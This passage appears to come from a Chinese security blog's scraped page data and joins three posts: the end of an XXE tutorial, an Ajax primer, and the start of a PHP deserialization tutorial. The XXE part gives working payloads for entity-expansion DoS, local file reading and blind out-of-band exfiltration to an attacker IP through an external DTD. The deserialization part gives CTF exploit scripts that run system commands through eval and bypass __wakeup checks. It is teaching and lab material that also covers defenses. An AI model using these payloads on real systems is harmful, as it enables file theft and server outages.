\"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt; &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt; &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt; &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。 亦或者，如果目标是UNIX系统， &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM \"file:///dev/random\" &gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; 如果 XML 解析器尝试使用/dev/random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。 十五、绕过姿势 参考cl4y师傅博客xxe笔记 绕过WAF保护的XXE ENTITY``SYSTEM``file等关键词被过滤 使用编码方式绕过：UTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml 若http被过滤，可以 6.1.data://协议绕过 &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a \" &lt;!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; \"&gt; %a; %b; ]&gt; &lt;test&gt;&amp;hhh;&lt;/test&gt; 6.2.file://协议文件上传 &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM \"file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\"&gt; %a; ]&gt; &lt;!--上传文件--&gt; &lt;!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; 6.3.php://filter协议文件上传 &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM \"php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\"&gt; %a; ]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--上传文件--&gt; &lt;!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'&gt; &lt;?xml version=\"1.0\" ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM \"php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\"&gt; %a; ]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--上传文件--&gt; PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg== 6.4 其他 方法1：文档中的额外空格 方法2：格式无效 方法3: 外来编码（Exotic encodings） 方法4：在一个文档中使用两种类型的编码 参考：https://xz.aliyun.com/t/4059 --绕过方法 十六、利用场景 7.1.svg &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY file SYSTEM \"file:///proc/self/cwd/flag.txt\" &gt; ]&gt; &lt;svg height=\"100\" width=\"1000\"&gt; &lt;text x=\"10\" y=\"20\"&gt;&amp;file;&lt;/text&gt; &lt;/svg&gt; tips:从当前文件夹读取文件可以使用/proc/self/cwd 7.2.excel 利用EXCEL进行XXE攻击 首先用excel创建一个空白的xlsx，然后解压 mkdir XXE &amp;&amp; cd XXE unzip ../XXE.xlsx 将[Content_Types].xml改成恶意xml，再压缩回去 zip -r ../poc.xlsx * 7.3 微信支付漏洞分析 实例二：微信支付的 XXE 前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，当然目前我是看不懂的，所以就先了解一下 漏洞描述： 微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品 下载 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中 如图所示： 问题就出现在横线划出来的那部分，也就是简化为下面的代码： public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception { try { Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder(); InputStream stream = new ByteArrayInputStream(strXML.getBytes(\"UTF-8\")); org.w3c.dom.Document doc = documentBuilder.parse(stream); ... 可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是实验的步骤 首先在 com 包下又新建了一个包，来写测试代码，测试代码命名为 test001.java 如图所示： test001.java package com.test.test001; import java.util.Map; import static com.github.wxpay.sdk.WXPayUtil.xmlToMap; public class test001 { public static void main(String args[]) throws Exception { String xmlStr =\"&lt;?xml version='1.0' encoding='utf-8'?&gt;\\r \" + \"&lt;!DOCTYPE XDSEC [\\r \" + \"&lt;!ENTITY xxe SYSTEM 'file:///d:/1.txt'&gt;]&gt;\\r \" + \"&lt;XDSEC&gt;\\r \"+ \"&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\\r \" + \"&lt;/XDSEC&gt;\"; try{ Map&lt;String,String&gt; test = xmlToMap(xmlStr); System.out.println(test); }catch (Exception e){ e.printStackTrace(); } } } 希望它能读取 D 盘下面的 1.txt 文件 运行后成功读取 如图所示： 当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的 http://apache.org/xml/features/disallow-doctype-decl true http://apache.org/xml/features/nonvalidating/load-external-dtd false http://xml.org/sax/features/external-general-entities false http://xml.org/sax/features/external-parameter-entities false 整个源码那位师傅打包好了已经上传百度云： 链接：https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw 提取码：xq1b 上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// 如图所示： 十七、XXE漏洞防御 8.1.禁用外部实体 使用开发语言提供的禁用外部实体的方法。 PHP： libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 8.2.过滤数据 可以将用户提交的xml数据进行过滤，例如关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 十八、WebGoat靶场练习 关卡一 第一关是让我们在提交表单之后，尝试通过利用xxe漏洞进行命令执行来列举对应服务器上的根目录 bp抓包之后发现，这里是可以解析xml的，那我们直接构造payload即可 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM \"file:///\" &gt;]&gt; &lt;comment&gt;&lt;text&gt;&amp;rabbit;&lt;/text&gt;&lt;/comment&gt; 这里提示我们成功列举，同时刷新网页之后会发现，列举出来的内容回显到了页面中 代码分析 看一下页面路由，找到java项目对应位置 先解释下上述代码涉及到的注解的含义： 注释 含义 @Autowired 控制如何完成自动连接或加载 @AssignmentPath(“xxe/simple”) 接收并处理发往xxe/simple的HTTP请求 @RequestMapping(method = POST, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE) 配置 url 映射 @ResponseBody 表示该方法的返回结果直接写入 HTTP 返回包的正文中 @RequestBody String commentStr 表示将请求中的数据写入到 commentStr 这个 String 对象中 可以看到这里会接受post请求中正文的内容，赋值给commentstr参数，接着先判断session中是否函数属性：applysecurity，来确定secure的布尔值，接着调用comment类的parsexml函数，对该参数内容进行xml解析 我们接着跟踪该函数看看具体实现： 先了解一下前置知识：主要关注 JAXB JAXBContext 前置知识：JAXB 作为 JDK 的一部分，能便捷地将 Java 对象与 XML 进行相互转换。 JAXBContext 是整个 JAXB API 的入口。主要用来构建 JAXB 实例newInstance()。 Marshaller接口，将Java对象序列化为XML数据。 Unmarshaller接口，将XML数据反序列化为Java对象。 JAXBContext.newInstance(Comment.class) 的作用是将 Comment 这个对象进行实例化，创建一个 JAXB 实例；实例名字在本代码中为 jc。 接着我们关注代码中的： 这里通过设置XMLConstants的属性来确定是否允许解析外部DTD，其中对于这两个属性的解释如下： 可以通过设置XMLConstants的两个属性来禁用外部实体解析，默认的空字符串就是禁用，但是这里secure值为true,所以没有禁用（SimpleXXE.java） 这里就懵逼了，不是说空字符串才是禁用吗，那这里按道理应该是secure值为false啊，这样才不会将其设置为空字符串。而且回到上一处地方，可以看到他是来判断session中是否含有applysecurity属性来设置的，但这里似乎在bp上也没有该属性，这意味着secure就应该是false。 这里先放一下，我们只需要知道这里肯定是支持解析外部DTD的，我们接着分析 var xsr = xif.createXMLStreamReader(new StringReader(xml));：使用 XMLInputFactory 创建一个 XMLStreamReader 对象，用于解析 XML 字符串。 最后创建一个Unmarshaller对象。返回的值是xml经过unmarshal方法处理的值。由于unmarshal在执行过程中解析了XML（该XML内容也是我们可控的），导致XXE注入 这里由于是解析外部DTD的，同时也没有任何过滤手段，这意味着我们随便注入即可。 代码修复 我们只需要禁止解析外部DTD即可，对应代码： package XXE; import lombok.var; import javax.xml.bind.JAXBContext; import javax.xml.bind.JAXBException; import javax.xml.stream.XMLInputFactory; import javax.xml.stream.XMLStreamException; import java.io.StringReader; public class XXERepair { public void Repair() throws JAXBException, XMLStreamException { String xml = \"&lt;?xml version=\\\"1.0\\\"?&gt; \" + \"&lt;!DOCTYPE doc [ \" + \"&lt;!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"&gt; \" + \"]&gt;&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;\"; var jc = JAXBContext.newInstance(Comment.class); // 创建了我们的工厂 读取xml的一个工厂 var xif = XMLInputFactory.newInstance(); // 不支持外部实体 // 后面两行是多加的代码 xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); // 不支持dtd xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); var xsr = xif.createXMLStreamReader(new StringReader(xml)); // 将我们的xml 变成我们的java对象 var unmarshaller = jc.createUnmarshaller(); unmarshaller.unmarshal(xsr); } public static void main(String[] args) throws JAXBException, XMLStreamException { XXERepair test = new XXERepair(); test.Repair(); } } 可以看到设置了XMLInputFactory对应的两个属性为false。 关卡二 这里说让我们尝试与上次相同的攻击目的，根据提示他说服务器可能会接受意想不到的数据格式。我们抓包看看有何变化 可以看到这里是json格式，根据提示我们肯定可以猜到这里可以修改json为xml即可 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM \"file:///\" &gt;]&gt; &lt;comment&gt;&lt;text&gt;&amp;rabbit;&lt;/text&gt;&lt;/comment&gt; 可以看到成功注入 代码分析 这里可以看到将http请求中的conten-type的内容赋值给了contenttype参数，接着通过 APPLICATION_JSON_VALUE.equals(contentType)与contentType.contains(MediaType.APPLICATION_XML_VALUE)来判断格式为xml还是json格式，随机选择对应的解析器进行解析。 之后的xml解析处理方法与上一关相同，没变化，漏洞原理一致，不赘述了 代码修复 与上一关类似，修改至与上一关相同即可 关卡三 这关考察xxe盲注，这里我没有webwolf服务器，就用的kali的http服务了。 思路就是通过file协议读取到目标文件，接着通过参数实体的作用将其构造为http请求，去请求我们的攻击机，最终通过查看请求日志即可看到相应的文件内容。 首先在bp上发送如下内容，接着在攻击机上构造evil.dtd文件 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY % dtd SYSTEM \"http://192.168.246.130:8000/evil.dtd\"&gt;%dtd;%print;%send;]&gt; &lt;comment&gt;&lt;text&gt;hacker&lt;/text&gt;&lt;/comment&gt; #evil.dtd &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!ENTITY % file SYSTEM \"file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt\"&gt; &lt;!ENTITY % print \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.246.130:8000/landing?text=%file;'&gt;\"&gt; 构造好xml数据发送即可，最终在kali上即可看到文件内容 代码分析 这里可以与第一关代码进行对比，就是缺少下列代码。删除了数据的回显，剩下的话与第一关就相同了 if (checkSolution(comment)) { return success(this).build(); } 代码修复 与第一关一致 十九、参考文章 https://xz.aliyun.com/t/3357#toc-8 WebGoat (A4) XML External Entities (XXE) 通过webgoat-xxe、jwt学习Java代码审计 WebGoat代码审计-05-XXE注入 JAVA代码审计之深入XXE漏洞挖掘与防御 https://www.cnblogs.com/zhengna/p/15740341.html --靶场实践参考","categories":["常见top漏洞"]},{"title":"Ajax详解","path":"/2023/07/27/ajax-xiang-jie/","content":"Ajax详解 0x01 简介 AJAX 全称为 Asynchronous JavaScript And XML，就是异步的 JS 和 XML。AJAX是一种用于创建快速动态网页的技术。通过AJAX可以在浏览器中向服务器发送异步请求，Ajax可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。AJAX不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式。 1.1 什么是同步请求？ 同步请求是指当前发出请求后，浏览器什么都不能做，必须得等到请求完成返回数据之后，才会执行后续的代码。相当于生活中的排队，必须等待前一个人完成自己的事物，后一个人才能接着办。也就是说，当JS代码加载到当前AJAX的时候会把页面里所有的代码停止加载，当这个AJAX执行完毕后才会继续运行其他代码。 1.2 什么是异步请求？ 异步请求就当发出请求的同时，浏览器可以继续做任何事，Ajax发送请求并不会影响页面的加载与用户的操作，相当于是在两条线上，各走各的，互不影响。一般默认值为true。异步请求可以完全不影响用户的体验效果，无论请求的时间长或者短，用户可以专心的操作页面的其他内容，并不会有等待的感觉。 1.3 XML XML是一种可扩展标记语言，被设计用来传输和存储数据。XML和 HTML类似，但XML中没有预定义标签，全都是自定义标签，用来表示一些数据。早期 AJAX 携带的数据类型和返回的数据类型为xml形式，这也是 AJAX 名称的由来。 尽管 X 在 Ajax 中代表 XML，但由于JSON的许多优势，比如更加轻量以和作为 Javascript 的一部分，目前 JSON 的使用比 XML 更加普遍。 1.4 优缺点 **优点：**可以无需刷新页面而与服务器端进行通信；允许你根据用户事件来更新部分页面内容。 **缺点：**没有浏览历史，不能回退；存在跨域问题；SEO（搜索引擎优化）不友好，因为数据是动态创建的，爬虫是爬不到的。 0x02 ajax请求的基本流程 要完整实现一个AJAX异步调用和局部刷新,通常需要以下几个步骤: 创建 XMLHttpRequest 请求对象, 即创建一个异步调用对象。（ new XMLHttpRequest() ） 打开请求地址，指定请求方式**。**（open） 设置响应HTTP请求状态变化的函数. 发送HTTP请求。（send） 监听对应的请求状态的变化。（ readystatechange事件 ） 读取响应数据，使用 JavaScript 和 DOM 实现局部刷新。 1.创建请求对象 为了使用 JavaScript 向服务器发送一个 http 请求，你需要一个包含必要函数功能的对象实例。这就是为什么会有 XMLHttpRequest 的原因。这是 IE 浏览器的 ActiveX 对象 XMLHTTP 的前身。随后 Mozilla，Safari 和其他浏览器也都实现了类似的方法，被称为 XMLHttpRequest。同时，微软也实现了 XMLHttpRequest 方法。 if (window.XMLHttpRequest) { // Mozilla, Safari, IE7+ ... httpRequest = new XMLHttpRequest(); } else if (window.ActiveXObject) { // IE 6 及以下 httpRequest = new ActiveXObject(\"Microsoft.XMLHTTP\"); } 2.打开请求地址，指定请求方式 open() 的第一个参数是 HTTP 请求方法，有 GET，POST，HEAD 以及服务器支持的其他方法，方法一定要是大写字母，否则其他一些浏览器（比如 FireFox）可能无法处理这个请求。 第二个参数是你要发送的 URL。 第三个参数是可选的，用于设置请求是否是异步的。如果设为 true (默认值)，即开启异步，JavaScript 就不会在此语句阻塞，使得用户能在服务器还没有响应的情况下与页面进行交互。 httpRequest.open('GET', 'http://www.example.org/some.file', true); 3.设置响应HTTP请求状态变化的函数 如果你使用 POST 请求，那就需要设置请求的 MIME 类型，设置请求头。 Content-Type:用于设定请求体中参数的类型 httpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 4.发送HTTP请求 send() 方法的参数可以是任何你想发送给服务器的内容，如果是 POST 请求的话，数据将在请求体中发送到服务端，发送数据应该用服务器可以解析的格式，像查询语句。 httpRequest.send( \"name=value&amp;anothername=\"+encodeURIComponent(myVar)+\"&amp;so=on\" ); 如果是 GET 请求一般不传输参数 httpRequest.send(); 5.监听请求状态的变化 只要 readyState 属性发生变化，就会调用相应的处理函数。这个回调函数会被用户线程所调用。XMLHttpRequest.onreadystatechange 会在 XMLHttpRequest 的readyState 属性发生改变时触发 readystatechange (en-US) 事件的时候被调用。 httpRequest.onreadystatechange = function () { } 6.读取响应数据，并做相应处理 httpRequest.onreadystatechange = function () { //readyState 是请求对象中的一个属性 4表示成功 //status 是 http 状态码 if (httpRequest.readyState == 4 &amp;&amp; /^2\\d{2}$/.test(httpRequest.status)) { console.log(httpRequest.status); //状态码 console.log(httpRequest.statusText); //状态字符串 console.log(httpRequest.getAllResponseHeaders()); //所有响应头 console.log(httpRequest.response); //响应体 } } 0x03 取消请求 如果该请求已被发出，XMLHttpRequest.abort() 方法将终止该请求。 httpRequest.abort()","tags":["基本知识"],"categories":["web知识总结"]},{"title":"浅析反序列化","path":"/2023/07/27/qian-xi-fan-xu-lie-hua/","content":"PHP反序列化 0x01 简介 什么是序列化？ 对象转换成字符串 为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等 什么是反序列化？ 字符串转换成对象 php序列化和反序列化的函数： 序列化：serialize() 反序列化：unserialize() tip：对字符串进行序列化后是它本身**（ctfshow web260）** 源码： &lt;?php error_reporting(0); highlight_file(__FILE__); include('flag.php'); if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){ echo $flag; } //因此直接?ctfshow=/ctfshow_i_love_36D/ 即可 0X02 为何要 PHP 的序列化和反序列化 看到这里，肯定会有人问这个问题，如果说 json 是为了传递数据的方便性，那么 PHP 的序列化又是为了什么呢？ 当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦，是不是很方便？ 0x03 常见的序列化格式 二进制格式 字节数组 json字符串 xml字符串 0x04 案例 数组序列化 &lt;?php $a = array('hello','hi'); $a_ser = serialize($a); echo $a_ser; ?&gt; 结果： a:2:{i:0;s:5:\"hello\";i:1;s:2:\"hi\";} 2：表示a有两个属性 i：表示int型数据；0：表示下标0 s：表示string字符串数组；5：长度为5 解析： a - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string 对象序列化 &lt;?php class Student{ public $name; public $age; function __construct(){ $this-&gt;name = 'abab'; $this-&gt;age = 18; } function pr(){ return $this-&gt;name; return $this-&gt;age; } } $stu = new Student(); $stu_ser = serialize($stu); echo $stu_ser ?&gt; 结果： O:7:\"Student\":2:{s:4:\"name\";s:4:\"abab\";s:3:\"age\";i:18;} 注：序列化后的内容只有成员变量，没有成员函数 还有一种成员变量就是protected类型 &lt;?php class test{ public $aa; private $bb; protected $cc; function __construct(){ $this-&gt;aa = 'aaa'; $this-&gt;bb = 'bbb'; $this-&gt;cc = 'ccc'; } } $d = new test(); $d_ser = serialize($d); echo $d_ser; ?&gt; 如果是private类型，会在变量名前加上**\\x00类名\\x00**，如果是protected类型，则会加上**\\x00*\\x00**， 这些都是不可见字符 输出则会导致不可见字符\\x00的丢失 结果： O:4:\"test\":3:{s:2:\"aa\";s:3:\"aaa\";s:8:\"testbb\";s:3:\"bbb\";s:5:\"*cc\";s:3:\"ccc\";} 如果需要本地存储推荐“urlencode” urlencode($d_ser); 序列化函数serialize() 首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了。 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。 可以在__sleep()方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性 实例： 即__sleep()方法使 flag age 属性序列化，而name并没有被序列化。所以可以在__sleep()方法里决定哪些属性被序列化。 0x05 访问控制修饰符 根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同，所以这里简单提一下 public(公有) protected(受保护) // %00*%00属性名 private(私有的) // %00类名%00属性名 protected属性被序列化的时候属性值会变成**%00*%00属性名** private属性被序列化的时候属性值会变成**%00类名%00属性名** （%00为空白符，空字符也有长度，一个空字符长度为 1） 实例： &lt;?php class Ctf{ public $name='Sch0lar'; protected $age='19'; private $flag='get flag'; } $ctfer=new Ctf(); //实例化一个对象 echo serialize($ctfer); ?&gt; //输出结果 O:3:\"Ctf\":3:{s:4:\"name\";s:7:\"Sch0lar\";s:6:\"*age\";s:2:\"19\";s:9:\"Ctfflag\";s:8:\"get flag\";} 可以看到 s:6:\"*age\" //*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6 s:9:\"Ctfflag\" //类名Ctf前后出现两个%00空白符，所以长度为9 0x06 PHP-反序列化 6.1 常见的PHP魔术方法 __construct()，类的构造函数，当一个对象创建时被调用，反序列化不触发 __destruct()，类的析构函数，但如果程序报错或者抛出异常，就不会触发该魔术方法 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，在静态上下文中调用一个不可访问的方法时调用 __get()，读取不可访问属性的值时调用 __set()，在给不可访问属性赋值时调用 __isset()，当对不可访问属性调用isset()和empty()时，__isset()被调用 __unset()，当对不可访问属性调用unset()时，__unset()会被调用 __sleep()，执行serialize()时，先会调用这个函数 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用 __set_state()，当调用var_export()导出类时，此静态方法会被调用 __clone()，当对象复制完成时调用 __debuginfo()，当转储对象以获取应显示的属性时，会被调用 __autoload()，尝试加载未定义的类 __serialize()，执行serialize()时，先会调用这个函数(这个和__sleep()的区别后面会详细介绍) __unserialize()，执行unserialize()时，先会调用这个函数(这个和__wakeup()的区别后面会详细介绍) 反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去 与序列化函数类似，unserialize()会检查类中是否存在一个__wakeup魔术方法 如果存在则会先调用__wakeup()方法，再进行序列化 可以在__wakeup()方法中对属性进行初始化、赋值或者改变。 反序列化之前重新给flag属性赋值 // 输出结果 object(Ctf)#2 (3) { [\"flag\"]=&gt; string(13) \"no flag\" [\"name\"]=&gt; string(7) \"Sch0lar\" [\"age\"]=&gt; string(2) \"18\" } 6.2 漏洞成因 原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。 在反序列化的过程中自动触发了某些魔术方法。 漏洞触发条件： unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法 而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。 6.3 序列化引擎 php对session的处理有三种引擎分别为php、php_serialize、php_binary.经过这三者处理后的session结构都不相同。 php_serialize\t-&gt;与serialize函数序列化后的结果一致 php -&gt;key|serialize后的结果 php_binary -&gt;键名的长度对应的ascii字符+键名+serialize()函数序列化的值 默认使用php引擎 使用php引擎的结果： 使用php_serialize引擎的结果： 使用php_binary引擎的结果如下 其中存在不可见字符，将结果进行URL编码如下 在session文件可写的情况下，可手动写入我们想要的内容,例如 &lt;?php ini_set('open_basedir','/var/www/html'); session_save_path('/var/www/html'); session_start(); highlight_file(__FILE__); include \"flag.php\"; $banner = \"--4ut15m-- \"; if($_SESSION['name']==='admin'){ echo $flag.\"&lt;br&gt;\"; }else if(isset($_GET['name']) &amp;&amp; isset($_GET['content'])){ if(preg_match('/ph/i',$_GET['name'])){ var_dump($_GET['name']); die('over'); }else file_put_contents('/var/www/html/'.$_GET['name'],$banner . $_GET['content']); } ?&gt; 该题目中可任意文件写入，故写入session文件构造name=admin.payload=|s:3:\"xxx\";name|s:5:\"admin\"; 简单说一下payload. banner和payload拼接在一起后变为--4ut15m-- |s:3:\"xxx\";name|s:5:\"admin\";经php序列化引擎反序列化后就成为了 $_SESSION=['--4ut15m-- ' =&gt; 'xxx', 'name' =&gt; 'admin'] 0x07 反序列化绕过小Trick 7.1 php7.1+反序列化对类属性不敏感 我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00 但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc &lt;?php class test{ protected $a; public function __construct(){ $this-&gt;a = 'abc'; } public function __destruct(){ echo $this-&gt;a; } } unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'); ?&gt; 7.2 绕过__wakeup 版本： ​ PHP5 &lt; 5.6.25 ​ PHP7 &lt; 7.0.10 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 例： &lt;?php class test{ public $a; public function __construct(){ $this-&gt;a = 'abc'; } public function __wakeup(){ $this-&gt;a='666'; } public function __destruct(){ echo $this-&gt;a; } } 如果执行unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}');输出结果为666 而把对象属性个数的值增大执行unserialize('O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";}');输出结果为abc 7.3 绕过部分正则 正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹 配的子串替换或者从某个串中取出符合某个条件的子串等。 preg_match('/^O:\\d+/') //匹配序列化字符串是否是对象字符串开头，+号可以实现绕过（+号代表空格） //另外反序列化在遇到+号时也会自动退出反序列化进程 利用加号绕过（在url传参时注意+编码为%2B） serialize(array( a ) ) a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构) &lt;?php class test{ public $a; public function __construct(){ $this-&gt;a = 'abc'; } public function __destruct(){ echo $this-&gt;a.PHP_EOL; } } function match($data){ if (preg_match('/^O:\\d+/',$data)){ die('you lose!'); }else{ return $data; } } $a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'; // +号绕过 $b = str_replace('O:4','O:+4', $a); unserialize(match($b)); // serialize(array($a)); unserialize('a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}}'); 对应 ctfshow web258 编写脚本： &lt;?php class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'backDoor'; public function __construct(){ $this-&gt;class=new backDoor(); } public function __destruct(){ $this-&gt;class-&gt;getInfo(); } } class backDoor{ public $code='system(\"cat flag.php\");'; public function getInfo(){ eval($this-&gt;code); } } $a = new ctfShowUser(); $a = serialize($a); $a= str_replace('O:', 'O:+',$a);//绕过preg_match echo urlencode($a); ?&gt; //主要是调用backDoor执行eval命令函数获取flag 7.4 利用引用 &lt;?php class test{ public $a; public $b; public function __construct(){ $this-&gt;a = 'abc'; $this-&gt;b= &amp;$this-&gt;a; } public function __destruct(){ if($this-&gt;a===$this-&gt;b){ echo 666; } } } $a = serialize(new test()); 上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等 对应于ctfshow 265 脚本代码： &lt;?php class ctfshowAdmin{ public $token; public $password; public function __construct($t,$p){ $this-&gt;token=$t; $this-&gt;password = &amp;$this-&gt;token; } public function login(){ return $this-&gt;token===$this-&gt;password; } } $a = serialize(new ctfshowAdmin('123','123')); echo urlencode($a); ?&gt; 7.5 16进制绕过字符的过滤 O:4:\"test\":2:{s:4:\"%00*%00a\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} 可以写成 O:4:\"test\":2:{S:4:\"\\00*\\00\\61\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} 表示字符类型的s大写时，会被当成16进制解析。 61(16进制)-&gt;97(十进制)-&gt;a(ASCII) &lt;?php class test{ public $username; public function __construct(){ $this-&gt;username = 'admin'; } public function __destruct(){ echo 666; } } function check($data){ if(stristr($data, 'username')!==False){ echo(\"你绕不过！！\".PHP_EOL); } else{ return $data; } } // 未作处理前 $a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}'; $a = check($a); unserialize($a); // 做处理后 \\75是u的16进制 $a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}'; $a = check($a); unserialize($a); 7.6 PHP反序列化字符逃逸 1.过滤后字符变多（反序列化后的一个x替换成为两个） &lt;?php function change($str){ return str_replace(\"x\",\"xx\",$str); } $name = 